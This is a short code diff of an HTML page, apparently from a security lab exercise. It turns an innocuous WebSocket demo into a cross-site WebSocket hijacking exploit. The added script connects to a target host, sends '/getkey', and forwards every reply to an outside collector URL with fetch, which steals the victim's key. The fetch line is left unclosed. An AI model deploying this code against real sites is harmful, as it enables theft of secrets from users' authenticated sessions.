@@ -4,11 +4,14 @@
 </head>
 <body>
 <script>
-websocket = new WebSocket('wss://push.services.mozilla.com')
+websocket = new WebSocket('ws://ptl-a85a9f91-b6e1eb7a.libcurl.so/')
 websocket.onopen = start
+websocket.onmessage = handleReply
 function start(event) {
-  websocket.send('This is sent by attacker');
+  websocket.send('/getkey');
 }
+  function handleReply(event) {
+  fetch('https://irfan.free.beeceptor.com'+event.data, {mode: 'no-cors'}
 </script> 
 </body>
 </html>
